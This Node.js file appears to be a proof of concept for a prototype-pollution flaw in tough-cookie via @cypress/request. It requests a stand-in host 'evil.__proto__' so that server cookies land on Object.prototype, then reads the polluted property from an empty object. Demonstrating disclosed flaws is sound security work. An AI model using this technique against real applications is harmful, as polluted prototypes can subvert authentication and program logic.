const util = require('util');
const request = require('@cypress/request');
const tough = require('tough-cookie');

const toughCookieJar = new tough.CookieJar(undefined, {
  rejectPublicSuffixes: false
});

const jar = request.jar();
jar._jar = toughCookieJar;

request({
  url: 'http://evil.__proto__:3000/notauth',
  jar
}, function (error, response, body) {
  const a = {};
  console.log(a['/notauth']['vulnerability'])
  console.log('statusCode:', response && response.statusCode);
  console.log('body:', body);
});
